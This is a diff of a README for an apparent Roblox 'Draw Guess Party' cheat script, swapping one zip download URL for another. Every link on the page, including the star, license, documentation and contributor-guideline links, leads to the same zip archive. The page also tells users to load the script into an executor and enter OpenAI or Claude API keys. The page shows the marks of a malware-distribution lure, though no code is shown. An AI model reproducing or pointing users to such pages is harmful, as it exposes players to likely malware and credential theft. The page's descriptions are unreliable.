@@ -2,8 +2,8 @@
 
 Welcome to the definitive **Draw Guess Party Roblox Script** repository! Here you'll find a meticulously crafted, high-octane script designed to supercharge your Roblox Draw & Guess experience with creative precision, AI-powered enhancements, and seamless integration. Whether you're orchestrating a cosmic guessing battle or letting inspiration run wild, this repository is your gateway to a uniquely dynamic session every time.
 
-[![Stars](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)
-[![MIT License](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)
+[![Stars](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)
+[![MIT License](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Step into the age of creative assistance! The script comes ready to dialogue wit
   
 Both integrations work as optional plug-and-play enhancements, allowing you to maintain control over your environment and data.
 
-> **Pro Tip:** See documentation (`https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip`) for a launchpad into AI-powered party gameplay.
+> **Pro Tip:** See documentation (`https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip`) for a launchpad into AI-powered party gameplay.
 
 ---
 
@@ -80,18 +80,18 @@ Stuck on a pixel, need a hand, or seeking sage wisdom at 2 a.m.? The included do
 
 Download the latest **Draw Guess Party Script** here:
 
-[![Download](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)
+[![Download](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)
 
-Just click the badge above to access the main `.lua` file! Dive into `https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip` for step-by-step deployment details and creative setup ideas.
+Just click the badge above to access the main `.lua` file! Dive into `https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip` for step-by-step deployment details and creative setup ideas.
 
 ---
 
 ## 💡 Getting Started
 
-**1. Download the script (https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)**    
+**1. Download the script (https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)**    
 **2. Load into the Roblox Studio or your preferred Executor tool**  
 **3. Follow the README configuration section**  
-**4. For AI features, plug in your OpenAI or Claude API keys as directed in `https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip`**
+**4. For AI features, plug in your OpenAI or Claude API keys as directed in `https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip`**
 
 Explore `/examples` for pre-designed themed rounds, or journey into `/custom-prompts` for creative expansion.
 
@@ -105,7 +105,7 @@ Dream bigger: The script is ingeniously designed with modularity in mind. Explor
 
 ## 🧩 Contributing
 
-We embrace creative spirits! Review the contributor guidelines in `https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip`. Submit your enhancements, bug zaps, or novel ideas—every brushstroke adds flair to the canvas.
+We embrace creative spirits! Review the contributor guidelines in `https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip`. Submit your enhancements, bug zaps, or novel ideas—every brushstroke adds flair to the canvas.
 
 ---
 
@@ -117,7 +117,7 @@ This repository and all included scripts are intended solely for educational and
 
 ## 📜 License — MIT
 
-This repository is open-minded under the [MIT License](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)—reuse, remix, and adapt, as long as you keep the original credits aligned.  
+This repository is open-minded under the [MIT License](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)—reuse, remix, and adapt, as long as you keep the original credits aligned.  
 © 2025 Draw Guess Party Script Creators
 
 ---
@@ -126,7 +126,7 @@ This repository is open-minded under the [MIT License](https://raw.githubusercon
 
 Still need the script? Here’s another portal to creativity:
 
-[![Download](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)](https://raw.githubusercontent.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/branch/Chichimec/draw-guess-party-roblox-toolkit_1.9-alpha.5.zip)
+[![Download](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)](https://github.com/MaykeMonteiro021/draw-guess-party-roblox-toolkit/raw/refs/heads/branch/Chichimec/party_draw_guess_toolkit_roblox_1.3.zip)
 
 Unleash a Draw Guess adventure at your next Roblox gathering!  
 Happy sketching, wild guessing, and AI-powered party mastery.
